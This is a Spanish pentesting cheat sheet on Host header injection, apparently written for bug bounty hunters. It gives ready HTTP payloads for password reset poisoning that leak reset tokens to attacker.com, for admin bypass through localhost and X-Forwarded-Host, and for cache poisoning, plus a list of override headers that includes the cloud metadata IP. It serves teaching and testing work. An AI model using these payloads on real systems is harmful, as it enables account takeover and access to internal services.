---
icon: database
---

# Host Header Injection

La cabecera `Host` indica al servidor el nombre del host al que se dirige la petición. Si la app usa este valor sin validar en operaciones críticas, se pueden realizar ataques como password reset poisoning, cache poisoning o SSRF.

#### Password Reset Poisoning

```http
-- Petición de reset normal --
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/json
{"email": "victim@empresa.com"}
→ Víctima recibe: https://target.com/reset?token=ABC

-- Con Host header modificado --
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json
{"email": "victim@empresa.com"}
→ Si la app construye el link con el header Host:
→ Víctima recibe: https://attacker.com/reset?token=ABC
→ Atacante captura el token en su servidor y resetea la contraseña
```

#### Bypass de autenticación con Host

```http
-- Si la app considera que localhost = acceso interno sin auth --
GET /admin HTTP/1.1
Host: localhost

-- X-Forwarded-Host para anular el Host --
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: localhost

-- Acceso a servicios internos --
GET / HTTP/1.1
Host: 192.168.1.10
```

#### Web Cache Poisoning

```http
-- Si el caché almacena por URL pero sirve distinto contenido según Host --
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

-- Si la respuesta incluye el Host en scripts/links y se cachea:
-- Otros usuarios recibirán la versión con attacker.com como dominio
-- Potencialmente: cargar JS de attacker.com
```

#### Detección

```bash
# Headers a probar
Host: localhost
Host: 169.254.169.254
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

> El Host Header injection en password reset es uno de los más impactantes en bug bounty porque permite tomar control de cualquier cuenta sin interacción técnica compleja — solo social engineering con el link envenenado.
